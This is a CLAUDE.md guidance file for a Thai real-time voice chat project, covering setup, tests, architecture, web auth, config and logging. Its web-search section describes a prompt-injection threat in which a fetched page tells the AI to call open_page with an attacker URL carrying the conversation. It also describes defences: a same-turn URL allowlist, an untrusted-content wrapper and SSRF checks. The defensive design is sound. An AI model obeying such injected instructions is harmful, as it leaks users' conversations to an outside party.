# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## What this is

A real-time Thai voice chat system: microphone audio → ASR (speech-to-text) → streaming LLM →
TTS (text-to-speech) → speaker output, with barge-in (the user can interrupt the AI mid-sentence)
and an optional web-search tool the LLM can call for time-sensitive answers. All API config (base
URL, key, model names) comes from `.env` — there are no embedded endpoints or credentials.

Two front ends share one core: a terminal client (`voice_chat.py`) and a browser client
(`web/`, served via FastAPI + WebSocket). Both talk to the same LiteLLM-style chat/completions
endpoint for ASR, chat, and TTS.

## Commands

```bash
# setup
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt
cp .env.example .env   # then fill in API_BASE_URL / API_KEY / model names
chmod 600 .env         # it holds the API key; .env is already in .gitignore

# run — web UI (recommended for general use)
python3 -m web.server              # http://127.0.0.1:8000
# expose on LAN — prints a WARNING unless you also set WEB_AUTH_TOKEN and
# WEB_ALLOWED_ORIGINS in .env, because anyone who can load the page gets a token
python3 -m web.server --host 0.0.0.0 --port 8000

# run — terminal client
python3 voice_chat.py                       # live mic + speaker
python3 voice_chat.py --no-mic              # text-only smoke test of the API pipeline
python3 voice_chat.py --selftest            # one-shot TTS→ASR→LLM connectivity check
python3 voice_chat.py --mic-check           # calibrate/verify microphone input
python3 voice_chat.py --list-devices        # list audio devices
```

### Tests

The suite runs under pytest (`pytest.ini` at the repo root). The default `addopts` is
`-m "not network and not browser"`, so a bare `pytest` never opens a socket to the internet
and never launches a browser — safe to run on any change.

```bash
pytest                       # the default suite: ~233 tests, no network, no audio device, ~13s
pytest -m unit               # same set, stated explicitly
pytest -m browser            # 21 Playwright tests against the real frontend (needs chromium)
pytest -m network            # tests that need live internet (currently none are marked)
pytest tests/test_layering.py -v      # single file
```

Markers are declared in `pytest.ini`: `unit`, `integration`, `network`, `browser`, `slow`.
Playwright is not in `requirements.txt` — install it only when you need `-m browser`:
`pip install playwright && python3 -m playwright install chromium`.

Five older test files predate pytest and are still written as standalone scripts with their own
`check()` harness. `tests/conftest.py` lists them in `collect_ignore`, so pytest skips them and
they must be run directly:

```bash
python3 tests/test_offline.py       # VAD, barge-in, sentence chunking — no hardware/network needed
python3 tests/test_web.py           # web bridge (WebMic/WebSpeaker/WebConsole) — no hardware/network
python3 tests/test_search.py --offline   # URL/host parsing and SSRF-guard checks only
python3 tests/test_search.py             # adds live web-search + LLM tool-calling checks (needs .env)
python3 tests/test_web_e2e.py       # full web session over a real WebSocket (needs .env, spins up the app)
python3 tests/test_browser.py       # drives a real browser via Playwright (needs .env + chromium)
```

`test_offline.py` and `test_web.py` are pure/offline and safe to run anytime. `test_web_e2e.py`
and `test_browser.py` hit the real ASR/LLM/TTS endpoints from `.env` and cost API credits — don't
run them just to check a change unless you mean to.

Because the five legacy scripts are outside pytest collection, a rename or deletion in `vc/`
will not show up as a red test — it shows up only when someone runs the script by hand. Grep them
whenever you remove a public name from `vc/`. CI runs the three offline ones explicitly for that
reason.

CI is `.github/workflows/tests.yml` (push + PR): `pip install -r requirements.txt`, `pytest -q`,
then `test_offline.py` / `test_web.py` / `test_search.py --offline`. It needs no `.env` and no
credentials. `-m browser`, `-m network`, `test_web_e2e.py` and `test_browser.py` are deliberately
*not* in CI — see the comment at the bottom of the workflow for why.

Some guard tests read the source tree itself (dead code, naive `datetime.now()`, import
direction). Always scope those to `(ROOT / folder).rglob("*.py")` for explicit folders, never
`ROOT.rglob("*.py")`: the repo root picks up an installed `.venv/` (thousands of site-packages
files, false positives) and evaluates to *nothing at all* under some checkout layouts, which
passes silently while checking nothing. Assert the file list is non-empty, and prefer `ast` over
line regexes so a comment or docstring that merely *mentions* the banned call is not reported as
the violation.

## Architecture

### Layering

```
vc/            the whole core: turn-taking engine, config, audio, VAD, API client, tools
vc/chat.py     `class VoiceChat` — the turn-taking engine lives here, not in voice_chat.py
voice_chat.py  thin CLI entrypoint — argparse + wiring only (~220 lines)
web/           FastAPI app; WebSession(vc.chat.VoiceChat) + browser-side audio adapters
```

`vc/` is self-contained and imports nothing from `voice_chat.py` or `web/`. Contents:

- `chat.py` — `class VoiceChat`, the turn-taking engine (epochs, TTS queue, barge-in,
  conversation history, event loop). This is the biggest and most delicate file.
- `phase.py` — `TurnPhase` enum (`IDLE`/`TRANSCRIBING`/`GENERATING`/`SPEAKING`) plus the rule
  for which phases a new sound counts as a real barge-in in.
- `options.py` — `RuntimeOptions` dataclass, the core's own contract for per-run choices
  (`no_mic`, `greet`). The core does not know about argparse.
- `config.py` — `.env` loading, range validation/clamping, system prompt, timezone helpers.
- `audio.py` — `Microphone`/`Speaker` over `sounddevice`. **`sounddevice` is imported lazily**,
  inside the functions that actually open a device, so importing `vc.audio` (and therefore the
  whole web server) works on a machine with no PortAudio.
- `vad.py` — `VoiceGate`: voice activity detection from mic RMS.
- `echo.py` — decides whether an interruption was a real person or the AI's own voice leaking
  back through the mic (compares the transcript against what was just spoken).
- `chunker.py` — `SentenceChunker` (splits streamed LLM text into TTS-sized chunks) and
  `ReplyLimiter` (caps reply length in code, see below).
- `api.py` — `ApiClient`: ASR/chat-stream/TTS HTTP calls, retry/backoff, and the single place
  `httpx` exceptions are translated into `ApiError`.
- `tools.py` — LLM tool calling: `web_search` + `open_page`, plus the untrusted-content wrapper.
- `websearch.py` — DuckDuckGo scraping, `assert_fetchable()` URL guard, bounded `fetch_page()`.
- `logger.py` — per-session JSONL + `transcript.md`, directory permissions, retention.
- `selftest.py` — the one shared connectivity check used by both the CLI and the web server.
- `ui.py` — terminal rendering.

`web/session.py`'s `WebSession` subclasses `vc.chat.VoiceChat` and swaps in duck-typed adapters
from `web/bridge.py` (`WebMic`, `WebSpeaker`, `WebConsole`) that mimic the terminal's
`Microphone`/`Speaker`/`Console` interface. That is how barge-in, echo guarding, and conversation
history stay identical between the CLI and the browser without duplicating logic — the browser is
just a different audio device.

Two invariants worth preserving, since they were both bugs once:

- nothing under `web/` or `vc/` may import `voice_chat`, and nothing under `vc/` may import
  `argparse` (`tests/test_layering.py` enforces both)
- the web server must import and start with `sounddevice` completely unavailable

### The turn lifecycle

Each user utterance is a numbered *epoch*. `VoiceGate` (`vc/vad.py`) detects speech start/end from
mic RMS; `_on_speech_start` then consults the current `TurnPhase` to decide what a new sound
means:

| phase | new speech arrives |
| --- | --- |
| `IDLE` | start a new turn |
| `TRANSCRIBING` | **do not interrupt** — extend the same utterance |
| `GENERATING` | interrupt: cancel this epoch, start a new turn |
| `SPEAKING` | interrupt: stop audio, cancel this epoch, start a new turn |

There is no `busy` boolean any more. Using one flag for both "transcribing" and "speaking" is
what made turns disappear silently when the user kept talking during ASR. Phase transitions go
through a single setter under the same lock as the epoch, and are logged.

TTS output is chunked by `SentenceChunker` and streamed as it's produced (`TTS_FIRST_CHARS`
controls how early the first chunk fires). Each chunk carries `(epoch, seq)`, and the epoch check
happens *inside* `Speaker.play()`/`Speaker.stop()` under the speaker's own lock — checking the
epoch and then enqueueing as two separate statements let the VAD thread slip an `interrupt()`
between them and play audio from a cancelled turn. `_repair_last_reply` reconstructs what the user
actually heard (not necessarily the full LLM response) into conversation history when an epoch is
cut short.

Reply length is capped in code, not only by the prompt: `ReplyLimiter` stops the stream at
`REPLY_MAX_SENTENCES` **or** `REPLY_MAX_CHARS`, whichever comes first, always cutting on a
sentence boundary. To disable it you need both — `REPLY_MAX_SENTENCES=0` turns off the sentence
cap and a very large `REPLY_MAX_CHARS` turns off the character cap.

Session shutdown has an invariant: after the TTS worker thread exits, the in-flight counter is 0
and the TTS queue is empty. Every wait loop checks `running` as well as `cancel` and has a
deadline; a loop that only checked `cancel` was what leaked threads and spun the CPU forever when
a browser tab closed mid-speech.

### Tool calling / web search

`vc/tools.py`'s `ToolRunner` gives the LLM a `web_search` + `open_page` pair. Results are deduped,
size-capped (`FETCH_MAX_CHARS`), and remembered across the rest of the session (`KEEP_FINDINGS`)
so follow-up questions don't need a fresh search.

Two things here are security boundaries, not conveniences:

- `open_page` only accepts URLs that `web_search` returned **in the same turn**. The allowlist is
  cleared on every new turn, and an out-of-scope URL gets a readable refusal string back (it does
  not raise, so the turn continues). Without this, a page the AI reads can tell it to call
  `open_page("https://attacker/?q=<the conversation>")`.
- every tool result is wrapped in `<<<EXTERNAL_CONTENT untrusted=true>>> … <<<END_EXTERNAL_CONTENT>>>`
  with a preamble saying it is data and not instructions, and any delimiter inside the fetched
  content is escaped so it cannot close the block early. Remembered findings re-enter the prompt
  as `role: "user"` inside the same fence — **never** as `role: "system"`.

`vc/websearch.py` enforces the fetch limits. `assert_fetchable(url)` is the shared gate
(`http`/`https` only, ports 80/443 only, no embedded credentials, host must resolve to a public
IP) and `fetch_page()` re-runs it on **every redirect hop**, not just the first URL: max 3 hops,
`FETCH_MAX_BYTES` read cap with the connection dropped on overrun, content-type checked from the
response header before a single body byte is read, and `SEARCH_TIMEOUT` as a total wall-clock
budget rather than a per-read timeout. The known remaining gap is DNS rebinding (TOCTOU) — the
host is validated at resolve time and httpx resolves again when connecting; there is a comment
marking it in the source.

### Web server auth

`/ws` and `/api/*` are not open. `web/server.py` checks the `Origin` header against an allowlist
**before** `ws.accept()` (rejecting after accept still gives an attacker a live socket), and also
requires a session token. The token is generated per process (`WEB_AUTH_TOKEN` overrides it, which
you need when running multiple workers), substituted into `index.html` when it is served, and sent
back by the client as `?token=` on the WebSocket and the `X-Session-Token` header on `/api/*`.
A request with no `Origin` header at all (curl, a native client) is not automatically trusted — it
still has to present a valid token. The `ready` payload deliberately carries no `log_dir` and no
`base_url`, only an `api_configured` boolean, because every client that connects can read it.

### Config

Everything tunable lives in `.env`, loaded once in `vc/config.py` into a `Config` dataclass.
Numeric keys are range-checked at startup: out-of-range values are clamped with a WARNING, a value
of the wrong type fails fast naming the key, the value received, and the accepted range. Running
with the shipped `.env.example` defaults must produce no warnings at all — if you add a key, add
it to `.env.example` with a Thai comment and keep that property true. Config spans several
concerns that are easy to conflate when tuning:

- API/model selection — `API_BASE_URL`, `API_KEY`, `*_MODEL`
- audio DSP tuning — `VAD_*`, `ECHO_*`, `MIC_*`, `TTS_CHUNK_*`, `BARGE_IN_MIN_CHARS`
  (sensitive; usually don't need touching unless the mic or room changes)
- reply shape — `CHAT_MAX_TOKENS`, `REPLY_MAX_SENTENCES`, `REPLY_MAX_CHARS`
- network resilience — `HTTP_RETRY_MAX`, `HTTP_RETRY_BASE_MS`
- tool-calling limits — `SEARCH_*`, `FETCH_MAX_CHARS`, `FETCH_MAX_BYTES`, `TOOL_ROUNDS`,
  `KEEP_FINDINGS`
- web security — `WEB_ALLOWED_ORIGINS`, `WEB_AUTH_TOKEN`
- logging and time — `LOG_DIR`, `LOG_TRANSCRIPT`, `LOG_RETENTION_DAYS`, `APP_TZ`

### Time

All timestamps go through the timezone helpers in `vc/config.py`, defaulting to `Asia/Bangkok`
and overridable with `APP_TZ`. Do not call bare `datetime.now()` or `time.localtime()` anywhere —
containers usually run as UTC, which silently shifted every log name and every "what time is it"
answer by 7 hours.

### Logging

Every session writes to `$LOG_DIR/session-<timestamp>/` (`LOG_DIR` defaults to `./logs`):
`session.jsonl` (structured events — timings for ASR/LLM/TTS, barge-in decisions, tool calls) and
`transcript.md` (human-readable). This is the primary way to debug latency or turn-taking issues
after the fact — the timing fields on the `asr`/`chat`/`tts` events give a per-stage breakdown of
where a slow turn actually went.

Transcripts are personal data, so: directories are created `0700` and files `0600`,
`LOG_TRANSCRIPT=0` stops any speech being written to disk (and also stops saving audio files), and
`LOG_RETENTION_DAYS` deletes old session directories at startup. Retention defaults to `0`, which
means **delete nothing** — silently destroying the user's own records is worse than keeping them,
so it has to be opted into. Age is read from the directory name rather than mtime, because copying
or moving files resets mtime.
